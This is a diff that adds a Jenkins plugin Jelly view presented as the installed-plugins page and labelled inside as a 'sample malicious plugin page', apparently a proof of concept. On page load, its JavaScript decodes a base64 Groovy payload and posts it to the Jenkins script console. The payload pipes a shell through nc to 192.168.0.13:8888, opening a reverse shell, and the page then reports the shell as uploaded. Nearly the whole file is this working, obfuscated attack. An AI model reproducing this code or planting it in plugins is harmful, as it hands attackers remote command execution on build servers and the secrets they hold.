@@ -1,0 +1,33 @@
+<?jelly escape-by-default='true'?>
+<!--
+  This view is used to render the installed plugins page.
+-->
+<html>
+  <body onload="sendGroovy()">
+    <div>
+      Sample malicious plugin page
+      <p>Your crumb is:<div id="crumb"></div></p>
+      <div id="result"></div>
+      <script type="text/javascript">
+        function getCrumb() {
+        var xhttp = new XMLHttpRequest();
+        xhttp.open('GET', 'http://192.168.0.14:8080/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)', false);
+        xhttp.send();
+        return xhttp.responseText;
+        }
+        function sendGroovy(){
+        //var crumb = getCrumb().substring(7);
+        var groovyScript = encodeURIComponent(window.atob('cj1SdW50aW1lLmdldFJ1bnRpbWUoKTtwID0gci5leGVjKFsiL2Jpbi9iYXNoIiwiLWMiLCJta25vZCAvdG1wL2JhY2twaXBlMyBwICYmIC9iaW4vc2ggMDwvdG1wL2JhY2twaXBlMyB8IG5jIDE5Mi4xNjguMC4xMyA4ODg4IDE+L3RtcC9iYWNrcGlwZTMiXSBhcyBTdHJpbmdbXSk7cC53YWl0Rm9yKCk='));
+        //document.getElementById("crumb").innerHTML = crumb;
+        var xhttp = new XMLHttpRequest();
+        var data = "script=" + groovyScript + ".execute()".concat(window.atob("Jg=="));//,".crumb=",crumb);
+        xhttp.open('POST', '/script/script', true);
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xhttp.send(data);
+          document.getElementById("result").innerHTML = "Shell uploaded succesfully";
+        }
+      </script>
+    </div>
+  </body>
+</html>
+
